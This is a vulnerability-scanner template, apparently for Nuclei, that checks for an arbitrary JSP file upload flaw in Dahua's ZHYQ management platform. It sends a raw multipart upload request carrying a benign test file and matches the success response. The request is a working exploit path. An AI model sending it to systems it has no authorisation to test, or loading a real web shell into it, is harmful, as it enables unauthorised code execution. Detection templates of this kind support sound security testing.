id: poc-yaml-dahua-zhyq-integrated-management-platform-video-file-upload
info:
  name: Dahua ZHYQ Integrated Management Platform Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: high
  tags: file-upload
http:
  - raw:
      - |
        POST /publishing/publishing/material/file/video HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
        Content-Length: 148

        --dd8f988919484abab3816881c55272a7
        Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"

        Test

        --dd8f988919484abab3816881c55272a7
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "VIDEO/"
          - "success!"
          - "data"
        part: body
      - type: word
        words:
          - "text/html;charset=UTF-8"
        part: header
